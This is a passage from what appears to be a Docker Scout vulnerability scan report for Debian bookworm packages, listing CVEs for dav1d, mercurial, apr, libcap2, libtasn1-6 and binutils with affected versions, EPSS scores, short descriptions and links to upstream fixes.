varnish: https://varnish-cache.org/security/VSV00013.html
varnish: https://github.com/varnishcache/varnish-cache/issues/3996
https://varnish-cache.org/docs/7.5/whats-new/changes-7.5.html#cve-2023-44487
Unaffected implementations not requiring code changes:
- rust-hyper: https://seanmonstar.com/post/730794151136935936/hyper-http2-rapid-reset-unaffected
- apache2: https://chaos.social/@icing/111210915918780532
- lighttpd: https://www.openwall.com/lists/oss-security/2023/10/13/9

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>dav1d</strong> <code>1.0.0-2</code> (deb)</summary>

<small><code>pkg:deb/debian/dav1d@1.0.0-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-1580?s=debian&n=dav1d&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.0.0-2%2Bdeb12u1"><img alt="medium : CVE--2024--1580" src="https://img.shields.io/badge/CVE--2024--1580-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.0.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.0.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.275%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An integer overflow in dav1d AV1 decoder that can occur when decoding videos with large frame size. This can lead to memory corruption within the AV1 decoder. We recommend upgrading past version 1.4.0 of dav1d.

---
- dav1d 1.4.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1064310)
https://code.videolan.org/videolan/dav1d/commit/2b475307dc11be9a1c3cc4358102c76a7f386a51 (1.4.0)
https://bugs.chromium.org/p/project-zero/issues/detail?id=2502

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>mercurial</strong> <code>6.3.2-1</code> (deb)</summary>

<small><code>pkg:deb/debian/mercurial@6.3.2-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-2361?s=debian&n=mercurial&ns=debian&t=deb&osn=debian&osv=12&vr=%3C6.3.2-1%2Bdeb12u1"><img alt="medium : CVE--2025--2361" src="https://img.shields.io/badge/CVE--2025--2361-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><6.3.2-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>6.3.2-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.176%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>39th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in Mercurial SCM 4.5.3/71.19.145.211. It has been declared as problematic. This vulnerability affects unknown code of the component Web Interface. The manipulation of the argument cmd leads to cross site scripting. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

---
- mercurial 6.9.4-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1100899)
https://lists.mercurial-scm.org/pipermail/mercurial-packaging/2025-March/000754.html
Fixed by: https://foss.heptapod.net/mercurial/mercurial-devel/-/commit/a5c72ed2929341d97b11968211c880854803f003 (6.9.4)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>apr</strong> <code>1.7.2-3</code> (deb)</summary>

<small><code>pkg:deb/debian/apr@1.7.2-3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-49582?s=debian&n=apr&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.7.2-3%2Bdeb12u1"><img alt="medium : CVE--2023--49582" src="https://img.shields.io/badge/CVE--2023--49582-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.7.2-3+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.7.2-3+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Lax permissions set by the Apache Portable Runtime library on Unix platforms would allow local users read access to named shared memory segments, potentially revealing sensitive application data.   This issue does not affect non-Unix platforms, or builds with APR_USE_SHMEM_SHMGET=1 (apr.h)  Users are recommended to upgrade to APR version 1.7.5, which fixes this issue.

---
- apr 1.7.5-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1080375)
[bookworm] - apr 1.7.2-3+deb12u1
[bullseye] - apr <ignored> (binary packages not affected due to APR_USE_SHMEM_SHMGET=1)
https://www.openwall.com/lists/oss-security/2024/08/26/1
https://lists.apache.org/thread/h5f1c2dqm8bf5yfosw3rg85927p612l0
Exposed by: https://github.com/apache/apr/commit/dcdd7daaef7ee6c077a4769a5bec1fbc11e5611f (trunk)
Exposed by: https://github.com/apache/apr/commit/ebd6c401ccceea461a929122526caacf9c9e7b1d (1.7.1-rc1)
Fixed by: https://github.com/apache/apr/commit/501072062dfcbc459f5d1e576113d17c7de84d5a (trunk)
Fixed by: https://github.com/apache/apr/commit/36ea6d5a2bfc480dd8032cc8651e6793552bc2aa (1.7.5)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libcap2</strong> <code>1:2.66-4</code> (deb)</summary>

<small><code>pkg:deb/debian/libcap2@1%3A2.66-4?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-1390?s=debian&n=libcap2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1%3A2.66-4%2Bdeb12u1"><img alt="medium : CVE--2025--1390" src="https://img.shields.io/badge/CVE--2025--1390-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1:2.66-4+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1:2.66-4+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.041%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The PAM module pam_cap.so of libcap configuration supports group names starting with “@”, during actual parsing, configurations not starting with “@” are incorrectly recognized as group names. This may result in nonintended users being granted an inherited capability set, potentially leading to security risks. Attackers can exploit this vulnerability to achieve local privilege escalation on systems where /etc/security/capability.conf is used to configure user inherited privileges by constructing specific usernames.

---
- libcap2 1:2.73-4 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1098318)
[bookworm] - libcap2 1:2.66-4+deb12u1
https://bugzilla.openanolis.cn/show_bug.cgi?id=18804
Fixed by: https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=1ad42b66c3567481cc5fa22fc1ba1556a316d878 (cap/v1.2.74-rc4)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libtasn1-6</strong> <code>4.19.0-2</code> (deb)</summary>

<small><code>pkg:deb/debian/libtasn1-6@4.19.0-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-12133?s=debian&n=libtasn1-6&ns=debian&t=deb&osn=debian&osv=12&vr=%3C4.19.0-2%2Bdeb12u1"><img alt="medium : CVE--2024--12133" src="https://img.shields.io/badge/CVE--2024--12133-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><4.19.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>4.19.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.411%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.

---
- libtasn1-6 4.20.0-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1095406)
https://www.openwall.com/lists/oss-security/2025/02/06/6
https://gitlab.com/gnutls/libtasn1/-/issues/52
https://gitlab.com/gnutls/libtasn1/-/commit/4082ca2220b5ba910b546afddf7780fc4a51f75a (v4.20.0)
https://gitlab.com/gnutls/libtasn1/-/commit/869a97aa259dffa2620dabcad84e1c22545ffc3d (v4.20.0)
https://lists.gnu.org/archive/html/help-libtasn1/2025-02/msg00001.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 45" src="https://img.shields.io/badge/L-45-fce1a9"/> <!-- unspecified: 0 --><strong>binutils</strong> <code>2.40-2</code> (deb)</summary>

<small><code>pkg:deb/debian/binutils@2.40-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-8225?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--8225" src="https://img.shields.io/badge/CVE--2025--8225-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.019%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.44 and classified as problematic. This issue affects the function process_debug_info of the file binutils/dwarf.c of the component DWARF Section Handler. The manipulation leads to memory leak. Attacking locally is a requirement. The identifier of the patch is e51fdff7d2e538c0e5accdd65649ac68e6e0ddd4. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=e51fdff7d2e538c0e5accdd65649ac68e6e0ddd4
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-8224?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--8224" src="https://img.shields.io/badge/CVE--2025--8224-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.44 and classified as problematic. This vulnerability affects the function bfd_elf_get_str_section of the file bfd/elf.c of the component BFD Library. The manipulation leads to null pointer dereference. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The name of the patch is db856d41004301b3a56438efd957ef5cabb91530. It is recommended to apply a patch to fix this issue.

---
- binutils 2.43.1-4 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32109
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=db856d41004301b3a56438efd957ef5cabb91530
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7546?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--7546" src="https://img.shields.io/badge/CVE--2025--7546-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in GNU Binutils 2.45. Affected by this issue is the function bfd_elf_set_group_contents of the file bfd/elf.c. The manipulation leads to out-of-bounds write. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used. The name of the patch is 41461010eb7c79fee7a9d5f6209accdaac66cc6b. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=41461010eb7c79fee7a9d5f6209accdaac66cc6b
https://sourceware.org/bugzilla/show_bug.cgi?id=33050
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-7545?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--7545" src="https://img.shields.io/badge/CVE--2025--7545-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in GNU Binutils 2.45. Affected by this vulnerability is the function copy_section of the file binutils/objcopy.c. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The patch is named 08c3cbe5926e4d355b5cb70bbec2b1eeb40c2944. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33049
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=08c3cbe5926e4d355b5cb70bbec2b1eeb40c2944
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66866?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66866" src="https://img.shields.io/badge/CVE--2025--66866-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_abi_tags in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66865?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66865" src="https://img.shields.io/badge/CVE--2025--66865-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_print_comp_inner in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66864?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66864" src="https://img.shields.io/badge/CVE--2025--66864-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>8th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_print_comp_inner in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66863?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66863" src="https://img.shields.io/badge/CVE--2025--66863-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_discriminator in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66862?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66862" src="https://img.shields.io/badge/CVE--2025--66862-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.049%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A buffer overflow vulnerability in function gnu_special in file cplus-dem.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66861?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--66861" src="https://img.shields.io/badge/CVE--2025--66861-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_unqualified_name in file cp-demangle.c in BinUtils 2.26 allowing attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5245?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--5245" src="https://img.shields.io/badge/CVE--2025--5245-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as critical has been found in GNU Binutils up to 2.44. This affects the function debug_type_samep of the file /binutils/debug.c of the component objdump. The manipulation leads to memory corruption. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32829
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=6c3458a8b7ee7d39f070c7b2350851cb2110c65a
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5244?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--5244" src="https://img.shields.io/badge/CVE--2025--5244-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.022%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>5th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils up to 2.44. It has been rated as critical. Affected by this issue is the function elf_gc_sweep of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. Upgrading to version 2.45 is able to address this issue. It is recommended to upgrade the affected component.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32858
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=d1458933830456e54223d9fc61f0d9b3a19256f5
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3198?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--3198" src="https://img.shields.io/badge/CVE--2025--3198-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>6th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.43/2.44 and classified as problematic. Affected by this vulnerability is the function display_info of the file binutils/bucomm.c of the component objdump. The manipulation leads to memory leak. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The patch is named ba6ad3a18cb26b79e0e3b84c39f707535bbc344d. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32716
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ba6ad3a18cb26b79e0e3b84c39f707535bbc344d
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11840?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11840" src="https://img.shields.io/badge/CVE--2025--11840-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.027%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A weakness has been identified in GNU Binutils 2.45. The affected element is the function vfinfo of the file ldmisc.c. Executing manipulation can lead to out-of-bounds read. The attack can only be executed locally. The exploit has been made available to the public and could be exploited. This patch is called 16357. It is best practice to apply a patch to resolve this issue.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33455
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11839?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--11839" src="https://img.shields.io/badge/CVE--2025--11839-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A security flaw has been discovered in GNU Binutils 2.45. Impacted is the function tg_tag_type of the file prdbg.c. Performing manipulation results in unchecked return value. The attack needs to be approached locally. The exploit has been released to the public and may be exploited.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33448
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1182?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1182" src="https://img.shields.io/badge/CVE--2025--1182-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.306%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in GNU Binutils 2.43. Affected is the function bfd_elf_reloc_symbol_deleted_p of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The patch is identified as b425859021d17adf62f06fb904797cf8642986ad. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32644
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=b425859021d17adf62f06fb904797cf8642986ad
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1181?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1181" src="https://img.shields.io/badge/CVE--2025--1181-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.408%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as critical was found in GNU Binutils 2.43. This vulnerability affects the function _bfd_elf_gc_mark_rsec of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The name of the patch is 931494c9a89558acb36a03a340c01726545eef24. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32643
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=931494c9a89558acb36a03a340c01726545eef24
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1180?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2025--1180" src="https://img.shields.io/badge/CVE--2025--1180-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.279%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic has been found in GNU Binutils 2.43. This affects the function _bfd_elf_write_section_eh_frame of the file bfd/elf-eh-frame.c of the component ld. The manipulation leads to memory corruption. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32642
binutils not covered by security support

</blockquote>
</details>

